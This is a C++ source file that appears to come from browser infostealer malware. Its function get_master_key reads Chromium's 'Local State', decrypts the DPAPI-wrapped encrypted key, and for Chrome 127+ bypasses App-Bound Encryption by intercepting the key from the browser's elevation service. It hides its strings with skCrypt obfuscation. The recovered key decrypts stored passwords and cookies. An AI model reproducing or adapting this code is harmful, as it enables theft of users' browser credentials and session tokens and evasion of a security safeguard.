#include <chromium/decrypt_db.hpp>
#include <chromium/abe.hpp>
#include <windows.h>
#include <filesystem>
#include <fstream>
#include <json/json.hpp>
#include <crypto_utils/base64.h>
#include <crypto_utils/crypto_helper.h>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;
using json = nlohmann::json;

namespace db_helper {

    static std::vector<BYTE> dpapi_decrypt_b64(const std::string& b64) {
        std::string raw = base64::from_base64(b64);
        if (raw.size() <= 5) return {};
        std::vector<BYTE> enc(raw.begin() + 5, raw.end()); //strip "DPAPI"
        return crypto_helper::dpapi_unprotect(enc);
    }

    std::vector<BYTE> get_master_key(const fs::path& browser_root) {
        fs::path ls = browser_root / skCrypt("Local State");
        if (!fs::exists(ls)) return {};

        std::ifstream f(ls, std::ios::binary);
        json j;
        try { f >> j; } catch (...) { return {}; }

        //use local var
        std::string k_osc = skCrypt("os_crypt");
        if (!j.contains(k_osc)) return {};
        auto& oc = j[k_osc];

        //Chrome 127+ ABE spawn browser and intercept the key from the elevation service
        if (oc.contains(skCrypt("app_bound_encrypted_key"))) {
            auto key = abe::get_abe_key(browser_root.string());
            if (key.size() == 32) return key;
            return {};  //ABE present but failed = DPAPI key wont work for ABE encrypted data
        }

        //pre-127 DPAPI only
        std::string k_ek = skCrypt("encrypted_key");
        if (oc.contains(k_ek)) {
            auto key = dpapi_decrypt_b64(oc[k_ek].get<std::string>());
            if (key.size() == 16 || key.size() == 32) return key;
        }

        return {};
    }
}
